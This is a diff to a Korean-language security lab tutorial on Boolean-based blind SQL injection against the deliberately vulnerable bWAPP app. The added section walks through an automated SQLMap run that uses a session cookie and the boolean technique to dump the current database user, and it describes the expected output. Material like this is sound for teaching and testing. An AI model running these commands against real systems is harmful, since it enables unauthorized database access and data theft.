@@ -102,7 +102,29 @@ curl -s \
 
 > 🚨 **해킹 작동 원리**:
 > 해커는 위와 같은 방식을 a부터 z까지 대입해 보면서 알파벳 단어를 완성해나갑니다. (`root@localhost` 등)
-> 이 글자를 하나씩 비교하는 과정은 사람이 수동으로 하기엔 너무 느리기 때문에, 주로 파이썬(Python) 자동화 스크립트를 작성하여 몇 분 안에 데이터베이스의 전체 암호 구문을 통째로 탈취(Dump)하게 됩니다.
+> 이 글자를 하나씩 비교하는 과정은 사람이 수동으로 하기엔 너무 느리기 때문에, 주로 파이썬(Python) 자동화 스크립트를 작성하거나 **SQLMap** 같은 공격 도구를 활용하여 몇 분 안에 데이터베이스의 전체 항목을 탈취하게 됩니다.
+
+---
+
+### Step 3: 취약점 스캐너 자동화 공격 (SQLMap 연동)
+
+Boolean-Based Blind SQLi는 추출 속도를 극대화하기 위해 거의 반드시 자동화 도구와 연계됩니다.
+실습 환경의 인증 정보(PHP Session ID)를 도구 실행 인자에 직접 부여하면, SQLMap 내장 스크립트가 참/거짓 패턴을 자동으로 인식하고 데이터베이스를 점령해줍니다.
+
+```bash
+# 1. 대상 URL, 세션 쿠키(-cookie), 점검 변수 지정(-p title) 후 DBMS 계정 정보 덤프(--current-user)
+sqlmap -u "http://192.168.0.20/bWAPP/sqli_4.php?title=Iron+Man&action=search" \
+       --cookie="PHPSESSID=발급받은세션값; security_level=0" \
+       -p title \
+       --technique=B \
+       --current-user \
+       --batch
+```
+
+**실행 결과 및 분석:**
+> 1. SQLMap이 `--technique=B` (Boolean-based blind 방식) 옵션 설정을 기반으로 자체 판단 기준을 빠르게 대입합니다.
+> 2. 터미널 결과에 `[INFO] GET parameter 'title' is 'MySQL boolean-based blind' injectable` 과 같은 파각(식별) 알림이 뜹니다.
+> 3. 최종적으로 시스템 내 현재 실행 중인 데이터베이스 유저명(`root@localhost` 등)을 화면 상에 단숨에 나열(Dump)하여 보여줍니다.
 
 ---
 
